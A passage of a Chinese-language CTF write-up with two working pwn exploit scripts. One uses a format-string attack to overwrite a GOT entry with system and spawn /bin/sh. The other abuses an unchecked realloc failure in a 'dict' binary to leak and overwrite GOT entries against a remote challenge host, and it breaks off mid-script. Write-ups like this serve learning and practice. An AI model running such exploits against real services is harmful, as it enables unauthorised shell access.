             len_t = length - len(cur_data)
             return cur_data + ch_t * len_t
    def generate_format_string(index, length):
             data = ""
             while True:
                       buff = "%%%d$p."%(index)
                       if len(data) + len(buff) > length:
                                return data, index
                       data += buff
                       index += 1
    def get_buff(io):
             index = 1
             times = 10
             total_buff = ""
             while times > 0:
                       io.read_until("Your Message: ")
                       data, index = generate_format_string(index, 127 - 20)
                       times -= 1
                       io.write('a' * 20 + data + "n")
                       data = io.read_until("n").strip()
                       total_buff += data
             io.gdb_hint()
             io.interact()
    def get_addr(io):
             index = 1
             times = 10
             total_buff = ""
             while times > 0:
                       io.read_until("Your Message: ")
                       data, index = generate_format_string(index, 127)
                       times -= 1
                       io.write(data + "n")
                       data = io.read_until("n").strip()
                       total_buff += data
             io.gdb_hint()
             addr = int(raw_input("addr to compare:"), 16)
             for index, item in enumerate(total_buff.split('.')[:-1]):
                       if item == "(nil)":
                                continue
                       print index + 1, "->", item, ":", hex(int(item, 16) - addr)
             io.interact()
    def pwn(io):
             io.read_until("Your Message: ")
             data = "%43$p.%51$p"
             io.write(data + "n")
             data = io.read_until("n").strip()
             data = data.split(".")
             libc_start_main = int(data[0], 16)
             fgets_got_addr = int(data[1], 16) - (0xf770c030 - 0xf770c018)
             #local
             #offset___libc_start_main_ret = 0x19a83
             #offset_system = 0x0003e800
             #offset_puts = 0x000656a0
             #offset_memset = 0x0007c680
             #remote
             offset___libc_start_main_ret = 0x19a83
             offset_system = 0x00040190
             libc_addr = libc_start_main - offset___libc_start_main_ret
             system_real_addr = libc_addr + offset_system
             text_addr = fgets_got_addr - 0x00002018
             break_point = text_addr + 0x0000081D
             print "fgets_got_addr:", hex(fgets_got_addr)
             print "break_point:", hex(break_point)
             print "system_real_addr:", hex(system_real_addr)
             io.gdb_hint()
             io.read_until("Your Message: ")
             data = "hello"
             io.write(data + "n")
             addr = l32(fgets_got_addr) + l32(fgets_got_addr + 1) + l32(fgets_got_addr + 2) + l32(fgets_got_addr + 3)
             now_index = 9
             system_real_str = l32(system_real_addr)
             total_buff = "/bin/sh;" + addr
             now_pos = len(total_buff)
             for i in range(4):
                       now_value = (system_real_addr >> (i*8)) & 0xff
                       print "now_value:", hex(now_value)
                       pad_count = 0
                       if now_value > now_pos:
                                pad_count = now_value - now_pos
                       else:
                                pad_count = 0x100 - (now_pos&0xff) + now_value
                       now_pos += pad_count
                       print "now_pos:", hex(now_pos)
                       print "pad_count:", hex(pad_count)
                       data = "%%%dc%%%d$hhn"%(pad_count, now_index)
                       now_index += 1
                       total_buff += data
             print total_buff
             io.write(total_buff + "n")
             io.interact()
    io = get_io(target)
    pwn(io)
flag如下:
### dict (400)
这个题目漏洞发现的比较早,但是构造利用的时候花的时间比较长。
漏洞的位置在条件新单词的时候,使用realloc函数申请内存,但是没有检查是否申请成功,如下:
假设申请内存特别大,此时realloc返回0,此时count为正数,也会进入读数据的循环中,在读数据之前,计算了存储的起始地址:
v1 = (char *)(0x20 * (count_before + j) + dict_info_804A0C4[index].buff);
若此时buff为0,那么v1的值就是(0x20 * (count_before + j),那么此时就只与前面的数量相关了,
发生任意写(地址为32的整数倍),为了实现任意读,其实可以在这里进行灵活控制来设置,将v1指向0x804a0c0(也就是全局存储结构体count,ptr变量的位置),这个刚好也为32的整数倍,将其buff的值进行覆盖,改成got表,就可以泄露地址,而且可以在增加的时候,进行地址覆盖,覆盖时候可以多覆盖几个count和buff这样就可以实现不同功能的地址引用。有的用于泄露,有的用于改写,因为地址没法重复利用。
利用方法:
1.申请6个字典
2.往字典1中添加4203782个单词,
#0x0804a0c0/0x20
count_to_node0 = 4203782
3.在申请0x0f101010个单词,发生realloc失败,填写全局变量0x804a0c0中的数据
4.分别泄露atoi,puts,memset(本来常理泄露一个就行,用libcdatabase就可以找到,但是有的不同libc中system地址根据偏移计算是对的,但是其他小函数计算就老是不对,在这里全泄露出来)
5.计算system地址,从 puts的got表开始覆盖,直至覆盖到atoi,puts和memset函数需要正确填写,因为后面还有用到:
6.在输入选择的时候,直接传“/bin/sh;”就可以拿到shell了。
代码如下:
    __author__ = "pxx"
    from zio import *
    import struct
    target = "./dict"
    target = ("202.120.7.146", 9992)#
    def get_io(target):
             io = zio(target, timeout = 9999)
             return io
    def full_buff(cur_data, length, ch_t = 'a'):
             len_t = length - len(cur_data)
             return cur_data + ch_t * len_t
    def create_dict(io, count, value_list):
             io.read_until("$ ")
             io.write("1n")
             io.read_until("dict: ")
             io.write(str(count) + "n")
             for index, item in enumerate(value_list):
                       io.read_until("%d:"%index)
                       io.write(item)
    def add_new_words(io, index, count, value_list, yes_sign = True):
             io.read_until("$ ")
             io.write("2n")
             io.read_until("dict: ")
             io.write(str(index) + "n")
             io.read_until("add? ")
             io.write(str(count) + "n")
             for index, item in enumerate(value_list):
                       io.read_until("Input new word %d: "%index)
                       print "send one", len(item)
                       length = len(item)
                       if length > 10000 and yes_sign:
                                index = 0
                                sign = False
                                add_count = 50000
                                while index  length:
                                                   index = length
                                                   sign = True
                                         else:
                                                   io.read_until("Input new word %d: "%(index/2 - 1))
                                io.read_until("Input new word %d: "%(index/2 - 1))       
                       else:
                                io.write(item)
    def view_words(io, index):
             io.read_until("$ ")
             io.write("3n")
             io.read_until("dict: ")
             io.write(str(index) + "n")
    def pwn(io):     
             puts_got_addr = 0x0804a020
             atoi_got_addr = 0x0804a038
             memset_got_addr = 0x0804a034
             len_to_write = atoi_got_addr - puts_got_addr
             value_list = [];
             value_list.append("n")
             #0x0804a020/0x20
             count_to_puts = 4203777
             #0x0804a0c0/0x20
             count_to_node0 = 4203782
             #0x0804a0e0/0x20
             count_to_node4 = 4203783
             #count_to_node0 = 20000
             create_dict(io, 1, value_list)#0
             create_dict(io, 1, value_list)#1
             create_dict(io, 1, value_list)#2
             create_dict(io, 1, value_list)#3
             create_dict(io, 1, value_list)#4
             create_dict(io, 1, value_list)#5
             value_list = []
             for i in xrange(count_to_node0):
                       value_list.append("8n")
             add_new_words(io, 0, count_to_node0, ["".join(value_list)])
             value_list = []
                                  #node0->count + ptr + node1->count + ptr
             payload = ""
             payload += l32(0x1) + l32(0) #0  can't move
             payload += l32(0x1) + l32(atoi_got_addr) #1 show
             payload += l32(count_to_puts) + l32(0x0) #2 add
             value_list.append(payload +"n")
             payload = ""
             payload += l32(0x1) + l32(puts_got_addr) #4 show
             payload += l32(0x1) + l32(memset_got_addr) #5 show
             value_list.append(payload +"n")
             value_list.append("n")
             add_new_words(io, 0, 0x0f101010, value_list, False)
             #print value_list
             view_words(io, 1)
             io.read_until("1: ")
             data = io.read(4)
             print [c for c in data]
             atoi_real_addr = l32(data)
             print "atoi_real_addr:", hex(atoi_real_addr)
             view_words(io, 4)
             io.read_until("1: ")
             data = io.read(4)